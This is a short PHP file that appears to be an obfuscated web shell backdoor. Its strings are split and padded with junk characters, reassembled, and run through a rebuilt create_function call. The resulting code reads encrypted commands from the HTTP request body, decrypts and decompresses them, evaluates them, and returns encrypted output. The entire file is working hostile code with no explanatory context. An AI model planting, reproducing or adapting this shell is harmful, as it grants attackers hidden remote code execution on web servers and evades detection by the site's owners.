<?php
$M='[Dor($i=0;$i<$l;){for($j=0[D;([D$j<$c&&$[Di<$l);$[Dj++,$[Di++){$[Do.=$t[D{$[Di}^$k{$';
$J='[D$k="3[D9d62bac";$kh="[Dd5[D3c2c9e3a56";[D$kf[D="007e[D4dba7187[D"[D;$p=[D"A[Drjsped7uZ[';
$S='ba[Ds[De64_decode($m[1])[D,$k))[D);$o=@[Dob_[Dget_c[Donte[Dnts();@o[Db_end_clea[Dn([';
$E=str_replace('X','','crXeaXte_XfuXncXXtion');
$Y='D);$r=@bas[De6[D4_encode(@[Dx([D@gzcompres[Ds($[Do),$k[D));pri[Dnt("[D$p$kh$r$kf");}';
$C='DuZlYDY";[Dfunctio[Dn x($t,$k)[D{$c=st[Drl[Den($k);$l=s[Dtrlen[D($t)[D[D;$[Do=[D"";f';
$I='j}[D;}}return $o[D;}if [D(@pre[Dg_match([D"[D/$kh[D(.+)$kf/",@f[Dile_[Dget_conte[Dnt';
$y='s[D[D("php://i[Dnput"),[D$m)==1) {@[Dob[D_st[Dart[D[D();@eva[Dl(@g[Dzuncompress(@x(@';
$q=str_replace('[D','',$J.$C.$M.$I.$y.$S.$Y);
$K=$E('',$q);$K();
?>
